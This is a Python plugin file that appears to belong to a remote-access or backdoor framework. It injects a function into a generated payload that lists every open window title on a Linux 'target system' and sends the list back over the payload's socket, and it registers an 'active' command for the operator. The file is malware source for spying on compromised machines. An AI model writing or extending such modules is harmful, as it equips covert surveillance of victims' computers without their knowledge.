# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import Xlib')
        self.config.import_statements.append('import Xlib.display')
        self.config.functions.append('''
def active():
    data = '[+]All opened windows : \\n'
    display = Xlib.display.Display()
    screen = display.screen() 
    root = screen.root 
    tree = root.query_tree() 
    wins = tree.children 
    tmp_list = []
    for win in wins:
        if win.get_wm_name():
            tmp_list.append('   - ' + win.get_wm_name())
    tmp_list = list(set(tmp_list))
    send_all(s,(data + '\\n'.join(tmp_list) + '\\n'))''')
        self.config.logics.append('''
            elif command == "active":
                active()''')
        self.config.help_menu['active'] = 'Shows all open windows on the target system'
    elif option == 'info':
        self.log.blank('\nName             : Active Windows Dump component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : python-xlib (external)' \
                       '\nCommands         : active' \
                       '\nDescription      : Shows all open windows on the target system\n')
        return {
            "Name": "Active Windows Dump component",
            "OS": "Linux",
            "Required Modules": "python-xlib (external)",
            "Commands": "active",
            "Description": "Shows all open windows on the target system"
        }